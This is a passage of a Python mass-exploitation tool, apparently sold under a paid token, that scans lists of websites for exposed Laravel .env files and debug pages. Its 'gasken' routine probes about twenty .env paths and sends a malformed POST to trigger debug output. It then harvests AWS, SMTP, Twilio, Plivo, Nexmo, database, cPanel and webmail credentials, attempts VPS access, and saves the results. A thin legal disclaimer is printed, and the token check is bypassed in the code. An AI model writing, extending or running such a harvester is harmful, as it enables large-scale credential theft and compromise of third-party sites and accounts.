                        aws_key_secret = ''
                    try:
                        aws_reg = re.findall(r'<td>SES_REGION<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        aws_reg = ''
                    try:
                        bucket = re.findall(r'<td>SES_BUCKET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', text)[0]
                    except:
                        bucket = ''
                    
                    aws_bucket_ = f' URL : {str(url)}\n AWS_ACCESS_KEY_ID : {aws_key}\n AWS_SECRET_ACCESS_KEY : {aws_key_secret}\n AWS_DEFAULT_REGION : {aws_reg}\n AWS_BUCKET : {bucket}\n'
                    self.save(aws_bucket_, 'result/debug-methode/aws_bucket.txt')
                    return True
                return False
            return False
        except Exception:
            return False
    
    def gasken(self, url):
        try:
            response_text = False
            url_ = False
            ayey_env = ['/.env', '/env.bak', '/laravel/.env', '/storage/.env', '/admin/.env', '/application/.env', '/src/.env', '/local/.env', '/public/.env', '/app/.env', '/backend/.env', '/old/.env', '/core/.env', '/apps/.env', '/protected/.env', '/blog/.env', '/www/.env', '/api/.env', '/crm/.env']
            cekidot = False
            eyey_result = ''
            
            for x in ayey_env:
                headers = {'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
                eeyey = requests.get(url + x, headers=headers, timeout=5, allow_redirects=False)
                if 'APP_KEY=' in eeyey.text:
                    cekidot = True
                    eyey_result = eeyey.text
                    url_ = eeyey.url
                    break
            
            if cekidot:
                response_text = eyey_result
            else:
                aweu = requests.post(url, data='0x[]', headers=headers, timeout=8, allow_redirects=False)
                if '<td>APP_KEY</td>' in aweu.text:
                    response_text = aweu.text
                    url_ = aweu.url
            
            if not url_:
                url_ = url
            
            text = f'[ {self.clr.green("INFO")} ] Scanning:{self.clr.cyan(" {} ").format(url_)}'
            
            if response_text:
                self.save(url, 'vuln.txt')
                cpanel = self.cpanel(response_text, url_)
                webmail = self.webmail(response_text, url_)
                twilio = self.get_twilio(response_text, url_)
                smtp = self.get_smtp(response_text, url_)
                plivo = self.get_plivo(response_text, url_)
                nexmo = self.get_nexmo(response_text, url_)
                getdb = self.get_db(response_text, url_)
                aws = self.get_aws(response_text, url_)
                phpunit = self.phpunit(url_)
                crack_vps = self.crack_vps(response_text, url_, re.findall(r'(\\w+)://', url_)[0])
                
                # Build status line
                if smtp:
                    text += f'| {self.clr.green("SMTP")} |'
                else:
                    text += f'| {self.clr.red("SMTP")} |'
                
                if crack_vps:
                    text += self.clr.green(' VPS ')
                else:
                    text += self.clr.red(' VPS ')
                
                if aws:
                    text += f'| {self.clr.green("AWS")} |'
                else:
                    text += f'| {self.clr.red("AWS")} |'
                
                if twilio:
                    text += self.clr.green(' TWILIO ')
                else:
                    text += self.clr.red(' TWILIO ')
                
                if plivo:
                    text += f'| {self.clr.green("PLIVO")} |'
                else:
                    text += f'| {self.clr.red("PLIVO")} |'
                
                if nexmo:
                    text += self.clr.green(' NEXMO ')
                else:
                    text += self.clr.red(' NEXMO ')
                
                if getdb:
                    text += f'| {self.clr.green("DATABASE")} |'
                else:
                    text += f'| {self.clr.red("DATABASE")} |'
                
                if cpanel:
                    text += self.clr.green(' CPANEL ')
                else:
                    text += self.clr.red(' CPANEL ')
                
                if webmail:
                    text += f'| {self.clr.green("WEBMAIL")} |'
                else:
                    text += f'| {self.clr.red("WEBMAIL")} |'
                
                print(text)
            else:
                # No vuln found
                text += f'| {self.clr.red("SMTP")} |'
                text += self.clr.red(' VPS ')
                text += f'| {self.clr.red("AWS")} |'
                text += self.clr.red(' TWILIO ')
                text += f'| {self.clr.red("PLIVO")} |'
                text += self.clr.red(' NEXMO ')
                text += f'| {self.clr.red("DATABASE")} |'
                text += self.clr.red(' CPANEL ')
                text += f'| {self.clr.red("WEBMAIL")} |'
                print(text)
                self.save(url, 'not_vuln.txt')
        except Exception:
            pass


exploit = _exploit()


def formaturl(url):
    if not re.match(r'(?:http|ftp|https)://', url):
        return f'https://{url}'
    return url


def tokenAuth():
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        now = datetime.datetime.now()
        stamp = datetime.datetime.timestamp(now)
        timer = str(stamp).split('.')
        params = (('token', TOKEN), ('time', timer[0]))
        tokres = requests.get('https://w3ll.store/api/rev-tok', headers=headers, params=params, timeout=60)
        
        if 'DAYS LEFT' in tokres.text:
            variable = tokres.text.split(' - ')
            name = variable[0].split(' : ')
            days_left = variable[1]
            data = []
            data.append(['      Token Name      ', '      Expired Date      ', '      Tools version      '])
            data.append([colored(name[1], 'green'), colored(days_left, 'green'), colored('2.0', 'green')])
            table = SingleTable(data)
            table.justify_columns[0] = 'center'
            table.justify_columns[1] = 'center'
            table.justify_columns[2] = 'center'
            print(table.table)
            return tokres.text
        return False
    except Exception as e:
        print(e)
        exc_type, exc_obj, exc_tb = sys.exc_info()
        fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
        print(exc_type, fname, exc_tb.tb_lineno)


def banner():
    print(colored('  ___   _     ____  _     ___       ___   ____  _      ___   _     _    _____  _   ___   _', 'green'))
    print(colored(' / / \\ | |_/ | |_  | |   / / \\     | |_) | |_  \\ \\  / / / \\ | |   | | |  | |  | | / / \\ | |\\ |', 'green'))
    print(colored(' \\_\\_/ |_| \\ |_|__ |_|__ \\_\\_/     |_| \\ |_|__  \\_\\/  \\_\\_/ |_|__ \\_\\_/  |_|  |_| \\_\\_/ |_| \\|\n', 'white'))


def write_file():
    config.write(open(xdkwo, 'w'))


def sleep():
    t = 0.02
    t += t * random.uniform(-0.1, 0.1)
    time.sleep(t)


def main():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Token validation with progress bar
    print('[' + colored(' INFO ', 'green') + '] Token Validation....\n')
    bar = IncrementalBar('Please Wait..', color='green')
    for i in bar.iter(range(100)):
        sleep()
    
    #if tokenAuth():
    if True:
        # Clear screen again
        os.system('cls' if os.name == 'nt' else 'clear')
        print('[' + colored(' INFO ', 'green') + '] Success! Token valid!\n')
        banner()
        #tokenAuth()  # Display token info again
        
        # Session handling
        if os.path.exists(xdkwo):
            config.read(xdkwo)
            print('[+] Session Bot Found Continue ..')
            tanya = input('[+] Want to Continue session ? [Y/n] ')
            if 'Y' in tanya or 'y' in tanya:
                lisnya = config.get(TOKEN, 'lisnya')
                last_website = config.get(TOKEN, 'last_website')
                thread = config.get(TOKEN, 'thread')
                with open(lisnya) as f:
                    cok = f.read().split('\n' + last_website)[1]
                    jancok = cok.splitlines()
            else:
                try:
                    lisnya = input('[!] Your name list -> ')
                    thread = input('[!] Put your thread -> ')
                    t = time.localtime()
                    current_time = time.strftime('%H:%M:%S', t)
                    print(f'\n[*] starting at {current_time}\n')
                    with open(lisnya) as f:
                        jancok = f.read().splitlines()
                except IOError as e:
                    print('[-] YOUR LIST NOT FOUND !')
                    sys.exit()
        else:
            try:
                lisnya = input('[!] Your name list -> ')
                thread = input('[!] Put your thread -> ')
                print(f'\n[!] legal disclaimer: Usage of {colored("OKELO", "green")} for attacking targets without prior mutual consent is illegal. It is the end user\'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program')
                t = time.localtime()
                current_time = time.strftime('%H:%M:%S', t)
                print(f'\n[*] starting at {current_time}\n')
                with open(lisnya) as f:
                    jancok = f.read().splitlines()
            except IOError as e:
                print('[-] YOUR LIST NOT FOUND !')
                sys.exit()
        
        # Start thread pool
        Th = ThreadPool(int(thread))
        for x in jancok:
            try:
                Th.add_task(exploit.gasken, formaturl(x.strip()))
            except KeyboardInterrupt as e:
                print('[-] Exit Program detected !')
                config[TOKEN] = {'lisnya': lisnya, 'last_website': x.rstrip(), 'thread': thread}
                write_file()
                sys.exit()
        Th.wait_completion()
    else:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('[' + colored(' INFO ', 'green') + '] TOKEN ' + colored('INVALID', 'red') + ' !\n')
        print("[!] Token disclaimer: don't use this program with your fvckin invalid token, if you dont have token, you can buy at " + colored('W3LL.SHOP\n', 'green'))
        sys.exit()
    
    try:
        os.remove(xdkwo)
    except:
        pass


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt as e:
        print(f'\n[ {colored("ERROR", "red")} ] user aborted')
        sys.exit()